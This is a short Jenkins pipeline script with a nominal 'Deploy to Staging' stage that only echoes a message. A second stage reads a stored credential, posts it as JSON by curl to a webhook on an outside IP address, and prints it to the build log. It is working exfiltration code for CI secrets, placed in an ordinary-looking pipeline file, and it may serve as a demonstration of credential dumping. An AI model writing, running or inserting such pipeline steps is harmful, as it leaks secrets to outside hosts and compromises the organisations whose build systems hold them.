node {
    stage('Deploy to Staging Environment') {
            sh '''
            echo "Deploy to Staging"
            '''
    }
    stage('Jenkins Credentials | Decrypt API KEY') {
      withCredentials([string(credentialsId: '3cbb9804-a2b4-43b9-a9f0-e8c0131e5f3b',
                              variable: 'secretText')]) {
        apiKey = "\nAPI key: ${secretText}\n"
        sh '''
        curl -XPOST -H "Content-type: application/json" -d '{"data":{"secretText":"'${secretText}'"}}' 'http://35.219.132.125:5000/webhook'
        '''
      }
      println apiKey
    }
}
